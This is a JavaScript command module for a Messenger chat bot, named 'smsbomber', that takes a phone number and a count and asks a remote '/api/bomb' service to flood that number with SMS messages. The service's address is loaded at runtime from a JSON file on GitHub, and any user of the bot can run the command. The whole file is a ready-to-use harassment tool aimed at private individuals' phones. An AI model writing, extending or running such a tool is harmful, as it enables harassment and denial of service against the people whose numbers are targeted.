const axios = require("axios");

const API_CONFIG_URL = "https://raw.githubusercontent.com/goatbotnx/xalmanx210/refs/heads/main/apis.json";
const API_KEY = "xalman-hub";
let apiBaseUrl = null;
let apiConfigRequest = null;

async function getApiBaseUrl() {
  if (apiBaseUrl) return apiBaseUrl;

  if (!apiConfigRequest) {
    apiConfigRequest = axios
      .get(API_CONFIG_URL, { timeout: 15000 })
      .then(({ data }) => {
        const baseUrl = data?.[API_KEY];

        if (typeof baseUrl !== "string" || !baseUrl.trim()) {
          throw new Error(`Missing API key in apis.json: ${API_KEY}`);
        }

        apiBaseUrl = baseUrl.replace(/\/+$/, "");
        return apiBaseUrl;
      })
      .finally(() => {
        apiConfigRequest = null;
      });
  }

  return apiConfigRequest;
}

const toBoldNum = (str) =>
  String(str).replace(/[0-9]/g, (c) => {
    const map = {
      "0": "𝟬", "1": "𝟭", "2": "𝟮", "3": "𝟯", "4": "𝟰",
      "5": "𝟱", "6": "𝟲", "7": "𝟳", "8": "𝟴", "9": "𝟵"
    };
    return map[c] || c;
  });

module.exports = {
  config: {
    name: "smsbomber",
    aliases: ["smb", "bomb"],
    version: "3.5",
    author: "𝐒𝐈𝐀𝐌 𝐀𝐇𝐌𝐄𝐃 𝐒𝐀𝐀𝐍",
    role: 0,
    countDown: 5,
    category: "tools",
    guide: {
      en: "{pn} <phone> [count]"
    }
  },

  onStart: async function ({ api, event, args, message }) {
    const { messageID } = event;
    const API_URL = `${await getApiBaseUrl()}/api/bomb`;

    const phone = args[0];
    const count = args[1] || 1;

    if (!phone || isNaN(phone) || phone.length < 11) {
      return message.reply("⚠️ Invalid Phone Number!\nExample: /smsbomb 018xxxxxxxx 1");
    }

    api.setMessageReaction("🚀", messageID, () => {}, true);

    try {
      const res = await axios.get(`${API_URL}?phone=${phone}&count=${count}`);

      if (res.data && res.data.status === true) {
        api.setMessageReaction("✅", messageID, () => {}, true);

        const data = res.data;

        const msg =
          `┌─[ 🚀 𝙎𝙈𝙎_𝘽𝙊𝙈𝘽𝙀𝙍 ]\n` +
          `│ 🎯 𝙏𝘼𝙍𝙂𝙀𝙏 : ${toBoldNum(data.target || phone)}\n` +
          `│ ⚡ 𝙈𝙊𝘿𝙀   : 𝙐𝙇𝙏𝙍𝘼_𝙁𝘼𝙎𝙏\n` +
          `│ 🔄 𝙍𝙊𝙐𝙉𝘿𝙎 : ${toBoldNum(data.total_rounds || count)}\n` +
          `└─[ ✅ 𝙎𝙏𝘼𝙏𝙐𝙎 : 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 ]`;

        return message.reply(msg);
      } else {
        throw new Error();
      }

    } catch (error) {
      api.setMessageReaction("❌", messageID, () => {}, true);

      const failMsg =
        `┌─[ 🚀 𝙎𝙈𝙎_𝘽𝙊𝙈𝘽𝙀𝙍 ]\n` +
        `│ 🎯 𝙏𝘼𝙍𝙂𝙀𝙏 : ${toBoldNum(phone)}\n` +
        `│ ⚡ 𝙈𝙊𝘿𝙀   : 𝙐𝙇𝙏𝙍𝘼_𝙁𝘼𝙎𝙏\n` +
        `│ 🔄 𝙍𝙊𝙐𝙉𝘿𝙎 : ${toBoldNum(count)}\n` +
        `└─[ ❌ 𝙎𝙏𝘼𝙏𝙐𝙎 : 𝙁𝘼𝙄𝙇𝙀𝘿 ]`;

      return message.reply(failMsg);
    }
  }
};
